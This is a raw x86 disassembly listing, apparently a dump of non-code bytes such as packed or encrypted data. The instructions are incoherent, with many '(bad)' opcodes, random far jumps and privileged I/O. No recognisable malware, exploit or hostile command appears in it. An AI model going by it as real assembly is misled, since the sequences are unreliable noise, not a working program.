  40c6d0:	xchg   esi,eax
  40c6d1:	jmp    0x8ac3e1bd
  40c6d6:	adc    eax,0x3ef22971
  40c6db:	shl    BYTE PTR [esi-0x2dc4886b],0xb9
  40c6e2:	scas   al,BYTE PTR es:[edi]
  40c6e3:	jmp    0x40c681
  40c6e5:	add    dl,dh
  40c6e7:	cmp    BYTE PTR [edx+0x33],al
  40c6ea:	mov    ds:0x99bdfaae,al
  40c6ef:	sub    eax,0x7d2b8fb0
  40c6f4:	jbe    0x40c766
  40c6f6:	mov    al,ds:0x2ef4ae1
  40c6fb:	push   esp
  40c6fc:	ficomp WORD PTR [edx]
  40c6fe:	xchg   ecx,eax
  40c6ff:	add    eax,0xf49afa47
  40c704:	fcom   QWORD PTR ds:0xb88e97e6
  40c70a:	adc    al,0x47
  40c70c:	bound  eax,QWORD PTR [edi-0x6a]
  40c70f:	fs and al,0xff
  40c712:	fadd   DWORD PTR [ebx+0x7a]
  40c715:	icebp  
  40c716:	test   bl,0x67
  40c719:	sbb    eax,ebx
  40c71b:	ret    
  40c71c:	xor    eax,0x443fa2a5
  40c721:	cmp    DWORD PTR [eax+0x6f],edi
  40c724:	dec    esp
  40c725:	rol    DWORD PTR ds:0xe674ed6d,0x63
  40c72c:	out    0x79,eax
  40c72e:	fdiv   DWORD PTR [edx-0x28]
  40c731:	data16 adc BYTE PTR [edi-0x2719270d],cl
  40c738:	lods   eax,DWORD PTR ds:[esi]
  40c739:	push   ebx
  40c73a:	pop    edx
  40c73b:	xchg   esp,eax
  40c73c:	leave  
  40c73d:	xor    al,0xfb
  40c73f:	push   es
  40c740:	mov    ebp,ecx
  40c742:	push   ecx
  40c743:	loopne 0x40c78d
  40c745:	jae    0x40c6de
  40c747:	dec    edx
  40c748:	xchg   edx,eax
  40c749:	rcr    ecx,0x55
  40c74c:	sbb    DWORD PTR [ebp+0x3e],ebp
  40c74f:	and    DWORD PTR [ebx+0x64],ebp
  40c752:	shr    BYTE PTR [ebp+0x75a2f6f7],0xfa
  40c759:	jg     0x40c740
  40c75b:	mov    ch,0x28
  40c75d:	jl     0x40c72f
  40c75f:	and    al,0x2c
  40c761:	repz jbe 0x40c708
  40c764:	outs   dx,DWORD PTR ds:[esi]
  40c765:	mov    edx,0xe1d09079
  40c76a:	jg     0x40c78f
  40c76c:	fwait
  40c76d:	jnp    0x40c7c3
  40c76f:	aam    0xdd
  40c771:	add    al,0xd1
  40c773:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c774:	div    dl
  40c776:	xchg   ebp,eax
  40c777:	push   ebp
  40c778:	inc    esi
  40c779:	jno    0x40c70c
  40c77b:	scas   eax,DWORD PTR es:[edi]
  40c77c:	xor    DWORD PTR [ecx],ebx
  40c77e:	jmp    0x40c7e1
  40c780:	or     bl,BYTE PTR ds:0x6f46c553
  40c786:	adc    eax,0x64d6c635
  40c78b:	(bad)  
  40c78c:	mov    DWORD PTR [ebx],edx
  40c78e:	jbe    0x40c713
  40c790:	push   es
  40c791:	add    BYTE PTR [edi-0x73],cl
  40c794:	mov    dl,0xce
  40c796:	ja     0x40c732
  40c798:	pusha  
  40c799:	sub    al,0x64
  40c79b:	pop    edx
  40c79c:	cmp    ebx,edx
  40c79e:	xchg   edi,eax
  40c79f:	inc    ebp
  40c7a0:	mov    dl,0xb8
  40c7a2:	or     BYTE PTR [ebx-0x6e],bh
  40c7a5:	fisubr DWORD PTR [eax-0x73]
  40c7a8:	pop    ebp
  40c7a9:	std    
  40c7aa:	dec    ebp
  40c7ab:	out    dx,al
  40c7ac:	addr16 jmp 0x40c760
  40c7af:	dec    ebx
  40c7b0:	popf   
  40c7b1:	sti    
  40c7b2:	ja     0x40c7b8
  40c7b4:	imul   esp,DWORD PTR [edi+ecx*8-0x7b],0xd36ba6b1
  40c7bc:	pop    ecx
  40c7bd:	mov    al,0x98
  40c7bf:	in     al,dx
  40c7c0:	pop    esp
  40c7c1:	push   es
  40c7c2:	lods   eax,DWORD PTR ds:[esi]
  40c7c3:	(bad)  
  40c7c4:	mov    eax,DWORD PTR [edx]
  40c7c6:	push   ds
  40c7c7:	popf   
  40c7c8:	xchg   esi,eax
  40c7c9:	jmp    0x40c81f
  40c7cb:	sub    ebp,ebp
  40c7cd:	imul   esp,DWORD PTR [edi-0x157c0b64],0xffffffc6
  40c7d4:	mov    ds:0xff0b55b9,eax
  40c7d9:	and    edi,ebp
  40c7db:	adc    ebp,edx
  40c7dd:	sbb    ch,BYTE PTR [ebx+0x9]
  40c7e0:	push   cs
  40c7e1:	test   eax,0x6c9e1605
  40c7e6:	or     dh,cl
  40c7e8:	mov    eax,0xaf99e73f
  40c7ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7ee:	push   ebx
  40c7ef:	outs   dx,DWORD PTR ds:[esi]
  40c7f0:	adc    DWORD PTR [edi],ebx
  40c7f2:	cmp    cl,bl
  40c7f4:	mov    bh,0xbe
  40c7f6:	(bad)
  40c7f9:	cli    
  40c7fa:	and    ch,al
  40c7fc:	sahf   
  40c7fd:	mov    al,ds:0xdb6acc63
  40c802:	(bad)  [edi+edx*2+0x3a]
  40c806:	push   esp
  40c807:	add    ebx,edx
  40c809:	hlt    
  40c80a:	xor    eax,0x6999fc8f
  40c80f:	push   ds
  40c810:	repnz cdq 
  40c812:	xchg   ebx,eax
  40c813:	and    cl,BYTE PTR [eax+edx*2-0x7da63e7b]
  40c81a:	dec    eax
  40c81b:	or     al,0xe7
  40c81d:	mov    dl,0xab
  40c81f:	cmp    bh,ch
  40c821:	pushf  
  40c822:	mov    bh,0x8f
  40c824:	inc    edi
  40c825:	in     al,0xaf
  40c827:	fld    DWORD PTR [ebp+eiz*4+0x77]
  40c82b:	fisub  DWORD PTR [esi+0x700c0a2]
  40c831:	jle    0x40c848
  40c833:	test   DWORD PTR [edx+edi*1],ebp
  40c836:	shr    DWORD PTR [ecx+0x4f],1
  40c839:	mov    ds:0x1168e078,eax
  40c83e:	sub    al,0x93
  40c840:	xchg   DWORD PTR [edx],esp
  40c842:	rcl    BYTE PTR [edi],1
  40c844:	retf   
  40c845:	es xchg esp,eax
  40c847:	sbb    esi,esi
  40c849:	inc    edi
  40c84a:	dec    edi
  40c84b:	fistp  QWORD PTR [edi]
  40c84d:	xchg   ecx,eax
  40c84e:	mov    al,ds:0xc7989dba
  40c853:	fwait
  40c854:	popa   
  40c855:	inc    edx
  40c856:	in     al,0xf0
  40c858:	pushf  
  40c859:	shl    DWORD PTR [bp+di+0x7b],1
  40c85d:	(bad)  
  40c85f:	retf   0x14b8
  40c862:	test   eax,0xe48322b6
  40c867:	nop
  40c868:	sub    ecx,DWORD PTR [eax+0x64]
  40c86b:	jmp    0x924e:0x5cc7d804
  40c872:	or     dl,bh
  40c874:	test   eax,0xa9b66acc
  40c879:	cmp    DWORD PTR [edx+ebx*2+0x61a94b9c],edi
  40c880:	pop    ds
  40c881:	inc    edi
  40c882:	xchg   ebx,eax
  40c883:	mov    edi,0xa34ed71d
  40c888:	xchg   esi,eax
  40c889:	std    
  40c88a:	stos   DWORD PTR es:[edi],eax
  40c88b:	mov    cl,0xbe
  40c88d:	inc    edi
  40c88e:	mov    ebp,0x85584434
  40c893:	push   ebp
  40c894:	jb     0x40c889
  40c896:	mov    bh,0xc1
  40c898:	fcomp  DWORD PTR [ebx-0x7c]
  40c89b:	push   cs
  40c89c:	cs (bad) 
  40c89f:	imul   esi,esp,0x36
  40c8a2:	in     al,dx
  40c8a3:	xchg   ecx,eax
  40c8a4:	inc    esi
  40c8a5:	enter  0x6bbc,0x8a
  40c8a9:	(bad)  
  40c8aa:	lods   eax,DWORD PTR ds:[esi]
  40c8ab:	mov    BYTE PTR [eax-0x6d],dl
  40c8ae:	adc    cl,ah
  40c8b0:	pop    ds
  40c8b1:	outs   dx,BYTE PTR ds:[esi]
  40c8b2:	inc    ebx
  40c8b3:	shl    DWORD PTR [ecx-0x584d617c],0x50
  40c8ba:	fsubrp st(1),st
  40c8bc:	loope  0x40c8f7
  40c8be:	mov    ah,0x88
  40c8c0:	rol    BYTE PTR [ebx],0xcb
  40c8c3:	ss js  0x40c8f1
  40c8c6:	clc    
  40c8c7:	clc    
  40c8c8:	int    0xe9
  40c8ca:	ins    DWORD PTR es:[edi],dx
  40c8cb:	sbb    edi,DWORD PTR [edx+0x25f8d7d2]
  40c8d1:	rcr    DWORD PTR [ebp+0x4c],cl
  40c8d4:	imul   eax,DWORD PTR [eax],0x7e670670
  40c8da:	mov    WORD PTR es:[ebx-0x2982c31b],?
  40c8e1:	adc    ebp,esi
  40c8e3:	push   0xe2f49f70
  40c8e8:	cmp    BYTE PTR [ecx-0x299a9aec],ch
  40c8ee:	jmp    0xb5a5:0x746324d6
  40c8f5:	xor    BYTE PTR [edi-0x61],0x4a
  40c8f9:	sbb    al,BYTE PTR cs:[ebx]
  40c8fc:	inc    ebp
  40c8fd:	sub    dh,dh
  40c8ff:	push   ecx
  40c900:	jo     0x40c897
  40c902:	dec    eax
  40c903:	inc    ecx
  40c904:	in     al,0xdf
  40c906:	arpl   WORD PTR [ebx],bp
  40c908:	fisttp DWORD PTR ds:0xbdd609f5
  40c90e:	jl     0x40c8e4
  40c910:	retf   
  40c911:	xchg   edx,eax
  40c912:	mov    al,ds:0xa251e5d7
  40c917:	aam    0x8
  40c919:	cwde   
  40c91a:	push   edi
  40c91b:	mov    edx,0x2cfb9456
  40c920:	jmp    0x75696c34
  40c925:	test   al,0x7d
  40c927:	int    0xf8
  40c929:	call   0x447:0xc12eac20
  40c930:	xor    ch,BYTE PTR [edx-0x7e]
  40c933:	lods   eax,DWORD PTR ds:[esi]
  40c934:	addr16 sahf 
  40c936:	fcomp  DWORD PTR [edi+eax*8]
  40c939:	mov    BYTE PTR [esi],bl
  40c93b:	cmp    al,0xd0
  40c93d:	sub    eax,0xa20be5a6
  40c942:	mov    ds:0x12b824c5,eax
  40c947:	div    DWORD PTR [edi-0x62893d6a]
  40c94d:	in     al,dx
  40c94e:	cmc    
  40c94f:	js     0x40c966
  40c951:	xchg   ebp,eax
  40c952:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c953:	and    al,0xb6
  40c955:	outs   dx,BYTE PTR ds:[esi]
  40c956:	push   ds
  40c957:	dec    ebp
  40c958:	dec    esp
  40c959:	mov    al,ds:0xb419f33c
  40c95e:	push   edi
  40c95f:	inc    esi
  40c960:	out    dx,eax
  40c961:	icebp  
  40c962:	add    eax,0xfd124c06
  40c967:	ror    BYTE PTR [edx-0x58],cl
  40c96a:	inc    esp
  40c96b:	push   cs
  40c96c:	arpl   WORD PTR [ebx+esi*4-0x1b],si
  40c970:	push   edi
  40c971:	inc    esi
  40c972:	pushf  
  40c973:	jp     0x40c98c
  40c975:	shl    al,0x45
  40c978:	and    BYTE PTR [edi-0x76],dh
  40c97b:	call   0x61d9:0xee16b0f9
  40c982:	pop    ebx
  40c983:	jmp    0x40c91c
  40c985:	jmp    DWORD PTR [eax]
  40c987:	inc    ecx
  40c988:	int3   
  40c989:	pop    edx
  40c98a:	adc    esi,DWORD PTR [eax-0x1a1ff4fe]
  40c990:	in     eax,0xc8
  40c992:	into   
  40c993:	inc    edi
  40c994:	jae    0x40c995
  40c996:	xchg   esi,esp
  40c998:	push   ds
  40c999:	shl    DWORD PTR [edi],1
  40c99b:	sbb    BYTE PTR ds:0xdd9c2488,al
  40c9a1:	fistp  QWORD PTR [ebp+0x26]
  40c9a4:	sub    edx,ebx
  40c9a6:	push   edi
  40c9a7:	int    0xcf
  40c9a9:	xor    al,0x8f
  40c9ab:	ds idiv bl
  40c9ae:	push   esp
  40c9af:	dec    esp
  40c9b0:	adc    DWORD PTR [edi-0x67],0xffffffe6
  40c9b4:	es stos BYTE PTR es:[edi],al
  40c9b6:	pop    ebx
  40c9b7:	mov    esi,0x4b9ce491
  40c9bc:	adc    bh,0x4e
  40c9bf:	mov    ch,0x10
  40c9c1:	dec    edi
  40c9c2:	or     edx,DWORD PTR [esi-0x29]
  40c9c5:	jnp    0x40ca1d
  40c9c7:	into   
  40c9c8:	jle    0x40c96a
  40c9ca:	rcl    BYTE PTR [ebp+0x41],1
  40c9cd:	stc    
  40c9ce:	and    eax,0x70154e6a
  40c9d3:	in     eax,dx
  40c9d4:	xchg   esi,eax
  40c9d5:	pop    ecx
  40c9d6:	adc    eax,0x9c425f34
  40c9db:	jnp    0x40ca27
  40c9dd:	popa   
  40c9de:	dec    ebx
  40c9df:	sar    BYTE PTR [eax+eiz*1-0x6a],cl
  40c9e3:	dec    edx
  40c9e4:	sbb    ch,BYTE PTR [ebp-0xb7adbc0]
  40c9ea:	or     DWORD PTR [ebx+esi*8+0x59],eax
  40c9ee:	in     al,dx
  40c9ef:	ja     0x40ca14
  40c9f1:	cwde   
  40c9f2:	(bad)  
  40c9f3:	stos   BYTE PTR es:[edi],al
  40c9f4:	into   
  40c9f5:	dec    ebp
  40c9f6:	cmp    BYTE PTR ds:0x891a023c,bh
  40c9fc:	sub    BYTE PTR [ebp-0x48],ch
  40c9ff:	fs jl  0x40c9c9
  40ca02:	(bad)  
  40ca03:	xchg   ebx,eax
  40ca04:	ss jbe 0x40ca74
  40ca07:	stos   DWORD PTR es:[edi],eax
  40ca08:	js     0x40ca1c
  40ca0a:	fcomp  QWORD PTR [ebp+0x1b]
  40ca0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca0e:	pusha  
  40ca0f:	jbe    0x40ca86
  40ca11:	iret   
  40ca12:	shl    DWORD PTR [eax+0x7d],cl
  40ca15:	(bad)  
  40ca16:	ds cmc 
  40ca18:	push   0x387a41d0
  40ca1d:	das    
  40ca1e:	inc    esp
  40ca1f:	mov    dh,0xa
  40ca21:	push   0xffffffb9
  40ca23:	loope  0x40ca11
  40ca25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca26:	in     eax,dx
  40ca27:	dec    ebx
  40ca28:	xor    BYTE PTR [esi],ah
  40ca2a:	mov    al,0xcc
  40ca2c:	fdiv   QWORD PTR [edx-0x4b]
  40ca2f:	ret    0x7beb
  40ca32:	stos   BYTE PTR es:[edi],al
  40ca33:	xor    esp,0x3d82428
  40ca39:	jecxz  0x40c9c9
  40ca3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca3c:	push   ecx
  40ca3d:	out    0x91,al
  40ca3f:	test   BYTE PTR fs:[ebx],0x4e
  40ca43:	lods   eax,DWORD PTR ds:[esi]
  40ca44:	or     dl,al
  40ca46:	outs   dx,DWORD PTR ds:[esi]
  40ca47:	je     0x40cac2
  40ca49:	adc    DWORD PTR [edx+ebp*1],edx
  40ca4c:	xor    BYTE PTR [edx+0x72],dh
  40ca4f:	and    edx,DWORD PTR [edi+0x3efb4482]
  40ca55:	cmc    
  40ca56:	and    BYTE PTR [edx+0x60a826e9],dh
  40ca5c:	cwde   
  40ca5d:	mov    eax,ds:0x3a5179f
  40ca62:	mov    al,0x3
  40ca64:	add    eax,0x1ed6e374
  40ca69:	jae    0x40ca5f
  40ca6b:	int3   
  40ca6c:	loope  0x40ca3d
  40ca6e:	pop    ecx
  40ca6f:	call   0x1b9c:0x54b7b170
  40ca76:	push   esp
  40ca77:	aaa    
  40ca78:	mov    ds:0xe2e4260a,eax
  40ca7d:	sahf   
  40ca7e:	lea    ecx,[eax]
  40ca80:	mov    DWORD PTR [ecx+0x286d2895],edi
  40ca86:	xchg   edx,eax
  40ca87:	or     eax,edx
  40ca89:	sbb    eax,0xbcf38a98
  40ca8e:	stc    
  40ca8f:	mov    ebx,0x19c56399
  40ca94:	pop    edi
  40ca95:	ficomp WORD PTR [ebp-0xdc2d9ad]
  40ca9b:	fisttp DWORD PTR [esi-0xf]
  40ca9e:	ins    DWORD PTR es:[edi],dx
  40ca9f:	push   ss
  40caa0:	add    eax,0x92c01f2a
  40caa5:	dec    edi
  40caa6:	aam    0xb5
  40caa8:	test   DWORD PTR [ebp+0x521225b8],edx
  40caae:	sub    BYTE PTR [ebx-0x454c2b60],bl
  40cab4:	jbe    0x40ca7a
  40cab6:	or     bl,BYTE PTR [ecx+0xa]
  40cab9:	mov    bl,0x39
  40cabb:	jle    0x40cab4
  40cabd:	or     eax,0xce806e5a
  40cac2:	cmp    bl,ah
  40cac4:	fimul  WORD PTR [esp+eax*8+0x251ed0fe]
  40cacb:	and    ebx,DWORD PTR [ebp+0xbefc653]
  40cad1:	sar    BYTE PTR [edi],cl
  40cad3:	jmp    0xa867:0x3e54081a
  40cada:	mov    gs,WORD PTR cs:[edx-0x77]
  40cade:	xchg   esi,eax
  40cadf:	inc    ecx
  40cae0:	jae    0x40ca77
  40cae2:	fsubrp st(4),st
  40cae4:	and    ah,bh
  40cae6:	lahf   
  40cae7:	and    al,0xe0
  40cae9:	push   esi
  40caea:	pop    ss
  40caeb:	call   0x4d26:0x36791005
  40caf2:	or     eax,0x6eeb30a1
  40caf7:	xor    BYTE PTR [eax+0x5670b645],ah
  40cafd:	xchg   esi,eax
  40cafe:	ror    DWORD PTR [ebx],1
  40cb00:	jle    0x40cb56
  40cb02:	in     eax,0xf
  40cb04:	(bad)  
  40cb05:	mov    edi,DWORD PTR [edi-0x56]
  40cb08:	or     al,0x79
  40cb0a:	loop   0x40cabf
  40cb0c:	xchg   cl,bh
  40cb0e:	jmp    0xcc5f:0x2352df8e
  40cb15:	(bad)  
  40cb16:	dec    ebx
  40cb17:	loop   0x40cb2b
  40cb19:	frstor [ebp+0x6e]
  40cb1c:	test   BYTE PTR [ecx-0x5c],ah
  40cb1f:	mov    esp,0x9332ac0
  40cb24:	xchg   esi,eax
  40cb25:	or     ebx,edi
  40cb27:	shr    BYTE PTR [ebp+0x3c6f0b74],cl
  40cb2d:	sti    
  40cb2e:	xchg   ebp,eax
  40cb2f:	sahf   
  40cb30:	xchg   DWORD PTR [ecx+ecx*2-0x3a],ecx
  40cb34:	outs   dx,BYTE PTR ds:[esi]
  40cb35:	pop    es
  40cb36:	jns    0x40cb96
  40cb38:	sub    al,0xd4
  40cb3a:	dec    ebp
  40cb3b:	jb     0x40cb6f
  40cb3d:	mov    al,ds:0x7492218c
  40cb42:	dec    esp
  40cb43:	loope  0x40cb17
  40cb45:	jmp    0xe3e8fd5a
  40cb4a:	or     dh,BYTE PTR [eax-0x415c718d]
  40cb50:	shl    ch,cl
  40cb52:	pop    eax
  40cb53:	pop    eax
  40cb54:	mov    esi,0xc900fb8f
  40cb59:	fistp  QWORD PTR ss:[edx-0x3b62b9ef]
  40cb60:	sub    eax,0x3a98c6af
  40cb65:	iret   
  40cb66:	push   0xffffff85
  40cb68:	fwait
  40cb69:	adc    DWORD PTR [ecx+0x5b799a9],esp
  40cb6f:	jl     0x40cafa
  40cb71:	xor    eax,DWORD PTR [edi-0x607dcc1]
  40cb77:	xchg   ecx,eax
  40cb78:	sub    bh,bh
  40cb7a:	sbb    ch,BYTE PTR [esi]
  40cb7c:	out    0x14,eax
  40cb7e:	es xchg esi,eax
  40cb80:	adc    bl,BYTE PTR [eax+0x5979759]
  40cb86:	ret    
  40cb87:	xor    bl,0x69
  40cb8a:	mov    edi,0x52feb3fe
  40cb8f:	jb     0x40cbd9
  40cb91:	rol    BYTE PTR [eax],0x3a
  40cb94:	repnz add BYTE PTR ds:0x2b126905,ah
  40cb9b:	repz jae 0x40cbe2
  40cb9e:	outs   dx,BYTE PTR ds:[esi]
  40cb9f:	clc    
  40cba0:	imul   ecx,esp,0x19f418ad
  40cba6:	mov    dl,0xfa
  40cba8:	cmp    DWORD PTR [ebx],ebx
  40cbaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbab:	int    0xc5
  40cbad:	sub    ch,bh
  40cbaf:	arpl   WORD PTR [edi+edi*2+0x79],bp
  40cbb3:	lahf   
  40cbb4:	bound  ebx,QWORD PTR [ecx-0x4a]
  40cbb7:	and    bh,ch
  40cbb9:	jb     0x40cb94
  40cbbb:	cmp    BYTE PTR [edx+0xe42b4c6],0x8b
  40cbc2:	(bad)
  40cbc6:	jle    0x40cbc4
  40cbc8:	inc    ebp
  40cbc9:	pop    edi
  40cbca:	jno    0x40cb67
  40cbcc:	mov    ds:0xdf6eb9c6,eax
  40cbd1:	nop
  40cbd2:	sub    al,BYTE PTR [eax-0x29]
  40cbd5:	fst    DWORD PTR [edx-0x38]
  40cbd8:	or     bl,BYTE PTR [ebx]
  40cbda:	jmp    0x3c9f:0xb970a811
  40cbe1:	or     al,0x4a
  40cbe3:	stos   DWORD PTR es:[edi],eax
  40cbe4:	out    0x5,eax
  40cbe6:	sbb    BYTE PTR [eax],dh
  40cbe8:	sbb    DWORD PTR [edx],ecx
  40cbea:	jb     0x40cba0
  40cbec:	pop    es
  40cbed:	dec    ecx
  40cbee:	pop    eax
  40cbef:	push   esi
  40cbf0:	mov    dl,0x4b
  40cbf2:	jo     0x40cb78
  40cbf4:	shr    ah,1
  40cbf6:	int3   
  40cbf7:	sub    eax,0xb47483ea
  40cbfc:	xchg   ecx,eax
  40cbfd:	add    eax,0xcbc4c78e
  40cc02:	mov    ebp,0xc57633e6
  40cc07:	sub    BYTE PTR [edx-0x80],0xfb
  40cc0b:	adc    BYTE PTR [ebp-0x2986e4a6],cl
  40cc11:	test   BYTE PTR ds:0xda22233c,al
  40cc17:	inc    edx
  40cc18:	scas   eax,DWORD PTR es:[edi]
  40cc19:	js     0x40cbf2
  40cc1b:	nop
  40cc1c:	dec    ebx
  40cc1d:	leave  
  40cc1e:	xor    esp,DWORD PTR [ecx+0x657bebc9]
  40cc24:	add    ebx,DWORD PTR [ebp-0x53056ce4]
  40cc2a:	sub    edi,edx
  40cc2c:	xchg   edi,eax
  40cc2d:	xchg   ebp,eax
  40cc2e:	push   edx
  40cc2f:	(bad)  
  40cc30:	inc    esi
  40cc31:	into   
  40cc32:	push   ebx
  40cc33:	push   ecx
  40cc34:	popf   
  40cc35:	popf   
  40cc36:	mov    edi,DWORD PTR [esi]
  40cc38:	sub    dl,0x70
  40cc3b:	test   dh,0x28
  40cc3e:	stos   DWORD PTR es:[edi],eax
  40cc3f:	scas   eax,DWORD PTR es:[edi]
  40cc40:	inc    esi
  40cc41:	xor    DWORD PTR [ecx+0x313b63d7],ebp
  40cc47:	add    bl,BYTE PTR [esi+0xc]
  40cc4a:	lahf   
  40cc4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc4c:	scas   al,BYTE PTR es:[edi]
  40cc4d:	fs mov al,0x7d
  40cc50:	pop    esp
  40cc51:	inc    edi
  40cc52:	pop    esi
  40cc53:	rcl    DWORD PTR [ecx-0x32676645],1
  40cc59:	aaa    
  40cc5a:	jne    0x40cc15
  40cc5c:	imul   esi,DWORD PTR [edi],0xffffffb2
  40cc5f:	sti    
  40cc60:	lods   al,BYTE PTR ds:[esi]
  40cc61:	xchg   ecx,eax
  40cc62:	adc    al,0xae
  40cc64:	push   ebp
  40cc65:	and    dh,ch
  40cc67:	sar    DWORD PTR [ecx-0x3a7f34d0],1
  40cc6d:	mov    cl,0x44
  40cc6f:	ja     0x40cc2a
  40cc71:	(bad)  
  40cc72:	mov    DWORD PTR [ebx],esi
  40cc74:	jecxz  0x40cc24
  40cc76:	repnz dec edi
  40cc78:	in     eax,dx
  40cc79:	pop    ebx
  40cc7a:	cld    
  40cc7b:	loope  0x40cced
  40cc7d:	dec    ebp
  40cc7e:	mov    ch,0x1f
  40cc80:	addr16 call 0xbf6f637b
  40cc86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc87:	lahf   
  40cc88:	scas   eax,DWORD PTR es:[edi]
  40cc89:	pop    ss
  40cc8a:	ins    DWORD PTR es:[edi],dx
  40cc8b:	and    ecx,DWORD PTR [ecx+ebx*8+0x25]
  40cc8f:	xchg   edi,eax
  40cc90:	mov    eax,ds:0x9bc8a22e
  40cc95:	fst    DWORD PTR [eax+esi*2-0x55]
  40cc99:	pop    edx
  40cc9a:	cwde   
  40cc9b:	lods   al,BYTE PTR ds:[esi]
  40cc9c:	and    ecx,DWORD PTR [ebx-0x755655a3]
  40cca2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cca3:	sub    eax,0xc4b3ac92
  40cca8:	iret   
  40cca9:	cli    
  40ccaa:	pop    ebp
  40ccab:	mov    ss,WORD PTR [ebx]
  40ccad:	clc    
  40ccae:	and    eax,0x2c19565b
  40ccb3:	mov    ah,0x14
  40ccb5:	aam    0x13
  40ccb7:	and    DWORD PTR [ecx+0x1a],ebp
  40ccba:	fcmovnu st,st(3)
  40ccbd:	inc    eax
  40ccbe:	mov    ch,BYTE PTR [esi+0x74f25211]
  40ccc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccc5:	or     bh,BYTE PTR [ecx]
  40ccc7:	mov    edx,0x8562ded2
  40cccc:	lahf   
  40cccd:	jmp    0x40ccc6
  40cccf:	into   
  40ccd0:	or     BYTE PTR [edi-0x50],bh
  40ccd3:	lods   al,BYTE PTR ds:[esi]
  40ccd4:	sti    
  40ccd5:	dec    ebp
  40ccd6:	jne    0x40cce0
  40ccd8:	ficom  DWORD PTR [esi+0x71077177]
  40ccde:	mov    WORD PTR [eax+0x2ec5064d],?
  40cce4:	push   0x59a9cd9c
  40cce9:	xchg   esi,eax
  40ccea:	adc    edi,esi
  40ccec:	mov    es,WORD PTR [ebx-0x7a]
  40ccef:	retf   0xeec9
  40ccf2:	out    dx,eax
  40ccf3:	cdq    
  40ccf4:	push   edx
  40ccf5:	mov    al,0xd0
  40ccf7:	mov    bl,0x1b
  40ccf9:	pop    ebp
  40ccfa:	in     eax,dx
  40ccfb:	sbb    al,0x6a
  40ccfd:	and    al,0x5
  40ccff:	enter  0x92a1,0xe8
  40cd03:	dec    esi
  40cd04:	push   ebp
  40cd05:	push   eax
  40cd06:	ret    0xff6a
  40cd09:	lods   eax,DWORD PTR ds:[esi]
  40cd0a:	(bad)  
  40cd0b:	adc    BYTE PTR [edx],dh
  40cd0d:	push   es
  40cd0e:	xor    eax,0xfc8b1f37
  40cd13:	call   0x518d:0x475301fa
  40cd1a:	out    dx,al
  40cd1b:	add    al,0x3
  40cd1d:	xchg   ebp,eax
  40cd1e:	out    dx,eax
  40cd1f:	hlt    
  40cd20:	pop    eax
  40cd21:	popf   
  40cd22:	inc    edx
  40cd23:	cmp    DWORD PTR [edx+0x40],esi
  40cd26:	mov    eax,ds:0x524bb7d7
  40cd2b:	scas   al,BYTE PTR es:[edi]
  40cd2c:	pop    es
  40cd2d:	loopne 0x40cd5d
  40cd2f:	loop   0x40cda0
  40cd31:	mov    ch,0xf2
  40cd33:	adc    DWORD PTR [esi+0x22e26c35],ebp
  40cd39:	add    eax,0x11068936
  40cd3e:	shl    eax,1
  40cd40:	sub    edx,0xffffffea
  40cd43:	out    dx,eax
  40cd44:	sahf   
  40cd45:	lahf   
  40cd46:	sbb    ecx,ebx
  40cd48:	dec    ebx
  40cd49:	mov    BYTE PTR [edi],dh
  40cd4b:	pop    es
  40cd4c:	and    eax,0x624e4d2b
  40cd51:	inc    esp
  40cd52:	jp     0x40cd42
  40cd54:	mov    bh,0xe
  40cd56:	inc    ebx
  40cd57:	int    0x3a
  40cd59:	es es and eax,0x4d02ae8e
  40cd60:	das    
  40cd61:	mov    cl,0x72
  40cd63:	imul   edi,edi,0xffffffd4
  40cd66:	inc    edx
  40cd67:	or     bl,dh
  40cd69:	add    eax,0xcd02ea1e
  40cd6e:	jno    0x40cdc4
  40cd70:	dec    edi
  40cd71:	add    esi,esi
  40cd73:	mov    al,ds:0xfb8777a4
  40cd78:	add    eax,0xa371a6d2
  40cd7d:	enter  0xde8b,0x46
  40cd81:	push   ebx
  40cd82:	cwde   
  40cd83:	inc    eax
  40cd84:	and    al,dl
  40cd86:	mov    dl,0xa3
  40cd88:	pop    ebx
  40cd89:	xchg   edx,eax
  40cd8a:	(bad)  
  40cd8b:	jmp    0xbe9c25cd
  40cd90:	std    
  40cd91:	(bad)  
  40cd92:	adc    BYTE PTR ds:[eax+0x1cfd57d9],ah
  40cd99:	jge    0x40cd82
  40cd9b:	imul   ecx,edx,0xd4ad322d
  40cda1:	adc    ebp,eax
  40cda3:	jl     0x40ce03
  40cda5:	mov    edx,DWORD PTR ds:0xd1daa42c
  40cdac:	fcom   QWORD PTR [eax-0x745f9774]
  40cdb2:	pop    ebp
  40cdb3:	pop    eax
  40cdb4:	(bad)  
  40cdb5:	lods   eax,DWORD PTR ds:[esi]
  40cdb6:	mov    DWORD PTR [esi+ebp*1+0xb035a57],ebx
  40cdbd:	ret    0xdea1
  40cdc0:	in     al,0x9
  40cdc2:	sar    DWORD PTR [esi-0x60],1
  40cdc5:	push   es
  40cdc6:	(bad)  
  40cdc7:	push   ebx
  40cdc8:	push   ebp
  40cdc9:	les    edx,FWORD PTR [ebp-0x65e7b20e]
  40cdcf:	hlt    
  40cdd0:	out    0x75,eax
  40cdd2:	or     eax,0x6f4a3e63
  40cdd7:	mov    dl,0x66
  40cdd9:	dec    esp
  40cdda:	jp     0x40ce33
  40cddc:	daa    
  40cddd:	jo     0x40ce2a
  40cddf:	pushw  ds
  40cde1:	arpl   WORD PTR [edx],cx
  40cde3:	leave  
  40cde4:	mov    cl,cl
  40cde6:	scas   eax,DWORD PTR es:[di]
  40cde8:	test   DWORD PTR [esi],esi
  40cdea:	dec    ebx
  40cdeb:	pop    es
  40cdec:	out    0x73,eax
  40cdee:	xchg   DWORD PTR [ebp-0x2a],ebp
  40cdf1:	xor    al,0x52
  40cdf3:	ror    DWORD PTR [esi+0x16dd4188],cl
  40cdf9:	jge    0x40cd85
  40cdfb:	fnsave [ebp+0x4d229705]
